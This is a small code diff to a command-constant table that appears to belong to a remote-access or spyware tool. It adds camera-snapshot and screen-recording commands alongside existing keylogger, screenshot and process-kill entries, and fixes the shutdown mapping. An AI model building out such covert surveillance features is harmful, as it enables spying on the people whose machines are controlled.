@@ -28,11 +28,13 @@ export const CONFIG = {
         PROC_KILL: "STOPPROC",
 
         CAM_RECORD: "cam_record",
+        CAMSHOT: "CAMSHOT",
         SCREENSHOT: "SCRSHOT",
+        SCR_RECORD: "SCR_RECORD",
         START_KEYLOG: "STARTKLOG",
         STOP_KEYLOG: "STOPKLOG",
 
-        SHUTDOWN: "restart",
+        SHUTDOWN: "shutdown",
         RESTART: "restart",
 
         ECHO: "echo",
